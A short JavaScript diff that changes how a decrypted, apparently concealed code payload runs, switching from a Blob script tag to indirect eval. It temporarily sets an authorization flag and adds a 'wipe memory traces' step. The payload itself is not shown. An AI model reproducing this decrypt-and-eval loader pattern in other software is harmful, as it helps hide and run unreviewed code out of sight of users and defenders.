@@ -76,16 +76,13 @@ window._hz_m3 = (function() {
 
     var code = new TextDecoder().decode(decryptedBuffer);
 
-    // In-memory isolated Blob execution
-    var blob = new Blob([code], { type: 'text/javascript' });
-    var blobUrl = URL.createObjectURL(blob);
-    var script = document.createElement('script');
-    script.src = blobUrl;
-    script.onload = function() {
-      URL.revokeObjectURL(blobUrl);
-      if (script.parentNode) script.parentNode.removeChild(script);
-    };
-    (document.head || document.documentElement).appendChild(script);
+    // True in-memory direct execution
+    window._hz_vault_authorized = true;
+    try {
+      (0, eval)(code);
+    } finally {
+      delete window._hz_vault_authorized;
+    }
 
     // Wipe memory traces
     code = null;
